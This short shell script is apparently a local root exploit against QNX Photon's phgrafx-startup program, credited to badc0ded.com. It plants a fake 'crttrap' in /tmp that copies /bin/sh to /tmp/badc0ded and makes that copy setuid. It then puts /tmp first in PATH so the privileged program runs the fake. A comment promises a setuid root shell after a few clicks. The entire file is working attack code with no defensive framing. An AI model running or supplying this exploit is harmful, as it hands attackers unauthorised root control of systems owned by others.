#!/bin/sh
#
# click test,restore,continue  
# now you should have a setuid root shell waiting in /tmp/badc0ded
#
# www.badc0ded.com
echo "#!/bin/sh" > /tmp/crttrap
echo "cp /bin/sh /tmp/badc0ded" >> /tmp/crttrap
echo "chmod 4777 /tmp/badc0ded" >> /tmp/crttrap
echo "/usr/bin/crttrap \$1 \$2 \$3 \$4 \$5 \$6 \$7 \$8 \$9 " >> /tmp/crttrap
chmod 755 /tmp/crttrap
export PATH="/tmp:$PATH"
/usr/photon/bin/phgrafx-startup

